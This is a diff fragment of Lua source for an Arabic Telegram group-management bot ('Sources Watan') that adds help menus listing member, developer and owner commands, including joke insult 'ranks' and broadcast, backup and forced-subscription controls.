+✯︙رفع + تنزيل ← مطي 
+✯︙تاك للمطايه
+ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
+✯︙رفع + تنزيل ← صخل
+✯︙تاك لصخوله
+ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
+✯︙رفع + تنزيل ← جلب
+✯︙تاك لجلاب
+ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
+✯︙رفع + تنزيل ← قرد 
+✯︙تاك لقروده
+ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
+✯︙رفع + تنزيل ← بقره
+✯︙تاك لبقرات
+ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
+✯︙رفع + تنزيل ← ضلع
+✯︙تاك لضلوع
+ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
+✯︙رفع + تنزيل ← ضلعه
+✯︙تاك للضلعات
+ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
+✯︙رفع + تنزيل ← طلي
+✯︙تاك لطليان
+ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
+✯︙رفع + تنزيل ← زاحف 
+✯︙تاك لزواحف
+ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
+✯︙رفع + تنزيل ← جريذي
+✯︙تاك لجريذيه
+ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
+✯︙رفع + تنزيل ← الصاك
+✯︙تاك للصاكين
+ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
+✯︙رفع + تنزيل ← الحاته
+✯︙تاك للحاتات
+ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
+➫ .[🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝚆𝙰𝚃𝙰𝙽. ](t.me/WaTaNTeaM)➤
+]]
+send(msg.chat_id_, msg.id_,(help_text or Text)) 
+return false
+end
+if text == 'م8' then
+if not Sudo(msg) then
+send(msg.chat_id_, msg.id_,'✯︙ هاذا الامر خاص بمطور\n✯︙ ارسل {م10} لعرض اوامر الاعضاء')
+return false
+end
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'✯︙ لا تستطيع استخدام البوت \n✯︙ يرجى الاشتراك بالقناه اولا \n✯︙ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
+local help_text = database:get(bot_id..'help8_text')
+Text = [[
+🏅┇𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁𝚂' 𝙾𝚁𝙳𝙴𝚁𝚂 .
+┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
+✯︙اوامر المطورين ( 👥).
+ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
+✯︙تفعيل ← تعطيل 
+✯︙المجموعات ← المشتركين ← الاحصائيات
+✯︙رفع ← تنزيل منشئ اساسي
+✯︙مسح الاساسين ← المنشئين الاساسين
+✯︙مسح المنشئين ← المنشئين
+✯︙اسم ~ ايدي + بوت غادر 
+✯︙اذاعه 
+ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
+➫ .[🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝚆𝙰𝚃𝙰𝙽. ](t.me/WaTaNTeaM)➤
+]]
+send(msg.chat_id_, msg.id_,(help_text or Text)) 
+return false
+end
+if text == 'م9' then
+if not Sudo(msg) then
+send(msg.chat_id_, msg.id_,'✯︙ هاذا الامر خاص بالمطور الاساسي\n✯︙ ارسل {م10} لعرض اوامر الاعضاء')
+return false
+end
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'✯︙ لا تستطيع استخدام البوت \n✯︙ يرجى الاشتراك بالقناه اولا \n✯︙ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
+local help_text = database:get(bot_id..'help9_text')
+Text = [[
+🎖┇ 𝙱𝙰𝚂𝙸𝙲 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 𝙲𝙾𝙼𝙼𝙰𝙽𝙳𝚂 .
+┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
+✯︙اهلا بك عزيزي 🔊
+✯︙اوامر مطور الاساسي 👨🏼‍✈️
+ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
+✯︙تفعيل
+✯︙تعطيل
+✯︙مسح الاساسين
+✯︙المنشئين الاساسين
+✯︙رفع/تنزيل منشئ اساسي
+✯︙رفع/تنزيل مطور ثانوي 
+✯︙مسح المطورين
+✯︙المطورين
+✯︙رفع | تنزيل مطور
+ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
+✯︙اسم البوت + غادر
+✯︙غادر
+✯︙اسم بوت + الرتبه
+✯︙حضر عام
+✯︙كتم عام
+✯︙الغاء العام
+✯︙قائمه العام
+✯︙مسح قائمه العام
+✯︙جلب نسخه الاحتياطيه
+✯︙رفع نسخه الاحتياطيه
+ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
+✯︙تحديث السورس
+✯︙المتجر 
+✯︙متجر الملفات
+✯︙تحديث المتجر
+✯︙الملفات
+✯︙مسح الملفات
+✯︙تعطيل + تفعيل + اسم ملف
+ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
+✯︙اذاعه خاص
+✯︙اذاعه
+✯︙اذاعه بالتوجيه
+✯︙اذاعه بالتوجيه خاص
+✯︙اذاعه بالتثبيت
+ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
+✯︙جلب نسخه البوت
+✯︙رفع نسخه البوت
+✯︙ضع عدد الاعضاء + العدد
+✯︙ضع كليشه المطور
+✯︙تفعيل/تعطيل الاذاعه
+✯︙تفعيل/تعطيل البوت الخدمي
+✯︙تفعيل/تعطيل التواصل
+✯︙تغير اسم البوت
+✯︙اضف/حذف رد للكل
+✯︙ردود المطور
+✯︙مسح ردود المطور
+ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
+✯︙الاشتراك الاجباري
+✯︙تعطيل الاشتراك الاجباري
+✯︙تفعيل الاشتراك الاجباري
+✯︙حذف رساله الاشتراك
+✯︙تغير رساله الاشتراك
+✯︙تغير الاشتراك
+ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
+✯︙الاحصائيات
+✯︙المشتركين
+✯︙المجموعات 
+✯︙تفعيل/تعطيل المغادره
+✯︙تنظيف المشتركين
+✯︙تنظيف الكروبات
+ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
+➫ .[🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝚆𝙰𝚃𝙰𝙽. ](t.me/WaTaNTeaM)➤
+]]
+send(msg.chat_id_, msg.id_,(help_text or Text)) 
+return false
+end
+if text == 'م10' then
+local help_text = database:get(bot_id..'help10_text')
+Text = [[
+🎒┇𝙼𝙴𝙼𝙱𝙴𝚁 𝙾𝚁𝙳𝙴𝚁𝚂 .
+┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
+✯︙اهلا بك عزيزي 🔊 .
+✯︙اوامر الاعضاء كالتالي ↓
+ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
+✯︙عرض معلوماتك ↑↓
+ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
+✯︙ايديي ← اسمي 
+✯︙رسايلي ← مسح رسايلي 
+✯︙رتبتي ← سحكاتي 
+✯︙مسح سحكاتي ← المنشئ 
+ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
+✯︙اوآمر المجموعه ↑↓
+ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
+✯︙الرابط ← القوانين – الترحيب
+✯︙ ايدي ← اطردني 
+✯︙اسمي ← المطور  
+✯︙كشف ~ بالرد بالمعرف
+✯︙كول + كلمه
+ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
+✯︙اسم البوت + الامر ↑↓
+ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
+✯︙بوسه بالرد 
+✯︙مصه بالرد
+✯︙رزله بالرد 
+✯︙شنو رئيك بهذا بالرد
+✯︙شنو رئيك بهاي بالرد
+✯︙تحب هذا
+ٴ━━━━━━ 𝐖𝐓𝐍 ━━━━━━ٴ
+➫ .[🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝚆𝙰𝚃𝙰𝙽. ](t.me/WaTaNTeaM)➤
+]]
+send(msg.chat_id_, msg.id_,(help_text or Text)) 
 return false
 end
 ----------------------------------------------------------------------------
